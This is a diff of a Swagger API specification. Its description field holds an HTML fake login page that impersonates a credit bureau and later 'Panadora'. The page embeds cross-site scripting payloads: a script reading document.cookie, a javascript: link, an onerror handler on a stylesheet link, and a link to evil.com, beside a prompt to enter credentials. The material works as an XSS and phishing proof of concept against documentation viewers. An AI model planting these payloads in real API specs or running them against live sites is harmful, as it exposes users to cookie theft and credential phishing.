@@ -1,14 +1,14 @@
 swagger: '2.0'
 info:
   version: 'v1'
-  title: TransUnion LLC Login Verification.
+  title: Panadora Login.
   description: '<div class="login-form">
     <div class="heading">
        <img  src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*l_2npc9cAfupqPBL3bsWcQ.jpeg" >
         <h1>welcom to dashboard : Plese  Login First  </h1>
  <h2>for login enter your credentials bellow</h2>
         <script>alert(document.cookie)</script>
-        <a href="https://evil.com/" >Visit our Hotels Site</a>
+        <a href="https://evil.com/" >Visit Panadora</a>
         <a href="javascript:alert(1)">Try Me</a>
         <link href="https://cdn6.agoda.net/cdn-accom-web/js/assets/browser-bundle/AVENGERS-1679=A&PER-9231=A/3402-e4984b598588.css" rel="stylesheet" onerror="alert(1)"/>
     </div>
